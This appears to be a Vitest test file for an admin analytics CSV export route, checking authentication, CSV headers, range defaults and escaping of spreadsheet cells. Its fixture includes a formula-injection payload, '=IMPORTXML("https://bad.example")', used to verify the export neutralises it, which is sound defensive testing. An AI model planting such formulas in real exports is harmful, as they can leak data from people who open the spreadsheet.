// @vitest-environment node

import { beforeEach, describe, expect, test, vi } from "vitest";

import type { AnalyticsSnapshot } from "@/lib/types";

const mockGetUserSession = vi.hoisted(() => vi.fn());
const mockGetAnalyticsSnapshot = vi.hoisted(() => vi.fn());

vi.mock("@/lib/auth", () => ({
  getUserSession: mockGetUserSession,
}));

vi.mock("@/lib/data", () => ({
  getAnalyticsSnapshot: mockGetAnalyticsSnapshot,
}));

const analyticsSnapshot: AnalyticsSnapshot = {
  rangeDays: 30,
  totalVisits: 1240,
  uniqueVisitors: 890,
  totalClicks: 510,
  clickThroughRate: 0.41,
  totalEmailLeads: 149,
  emailLeadRate: 0.12,
  serviceBreakdown: [{ service: "spotify", clicks: 320 }],
  referrers: [
    {
      label: '=IMPORTXML("https://bad.example")',
      visits: 620,
      clicks: 290,
      ctr: 0.47,
    },
  ],
  utms: [
    {
      source: "instagram",
      medium: "social",
      campaign: "release, week",
      visits: 410,
      clicks: 210,
      ctr: 0.51,
    },
  ],
  geos: [{ country: "United States", city: "Los Angeles", visits: 140, clicks: 68, ctr: 0.49 }],
  devices: [{ label: "mobile", visits: 870, clicks: 420, ctr: 0.48 }],
  songs: [
    {
      songId: "song-1",
      username: "warcry",
      slug: "release",
      title: "Release",
      visits: 1240,
      clicks: 510,
      ctr: 0.41,
    },
  ],
  daily: [
    { date: "2026-05-16", visits: 120, uniqueVisitors: 98, clicks: 42, ctr: 0.35 },
    { date: "2026-05-17", visits: 190, uniqueVisitors: 155, clicks: 88, ctr: 0.46 },
  ],
};

describe("GET /api/admin/analytics/export", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockGetUserSession.mockResolvedValue({
      userId: "user_1",
      username: "warcry",
    });
    mockGetAnalyticsSnapshot.mockResolvedValue(analyticsSnapshot);
  });

  test("requires an authenticated admin session", async () => {
    const { GET } = await import("@/app/api/admin/analytics/export/route");

    mockGetUserSession.mockResolvedValueOnce(null);

    const response = await GET(
      new Request("https://backstage.test/api/admin/analytics/export"),
    );

    expect(response.status).toBe(401);
    await expect(response.json()).resolves.toEqual({
      error: "Sign in before exporting analytics.",
    });
  });

  test("exports analytics CSV for the requested range with safe spreadsheet cells", async () => {
    const { GET } = await import("@/app/api/admin/analytics/export/route");

    const response = await GET(
      new Request("https://backstage.test/api/admin/analytics/export?range=7"),
    );
    const body = await response.text();

    expect(mockGetAnalyticsSnapshot).toHaveBeenCalledWith("user_1", 7);
    expect(response.headers.get("content-type")).toBe("text/csv; charset=utf-8");
    expect(response.headers.get("content-disposition")).toMatch(
      /^attachment; filename="backstage-analytics-7d-\d{4}-\d{2}-\d{2}\.csv"$/,
    );
    expect(response.headers.get("cache-control")).toBe("no-store");
    expect(body).toContain('"Summary","Range days","7"');
    expect(body).toContain('"Summary","Visits","1240"');
    expect(body).toContain('"Summary","Email leads","149"');
    expect(body).toContain('"Summary","Email lead rate","12%"');
    expect(body).toContain('"Streaming services","Spotify","320"');
    expect(body).toContain('"Top sources","\'=IMPORTXML(""https://bad.example"")","620","290","47%"');
    expect(body).toContain('"Campaigns","instagram","social","release, week","410","210","51%"');
    expect(body).toContain('"Per-song performance","Release","/warcry/release","1240","510","41%"');
  });

  test("defaults unknown ranges to 30 days", async () => {
    const { GET } = await import("@/app/api/admin/analytics/export/route");

    await GET(
      new Request("https://backstage.test/api/admin/analytics/export?range=999"),
    );

    expect(mockGetAnalyticsSnapshot).toHaveBeenCalledWith("user_1", 30);
  });
});
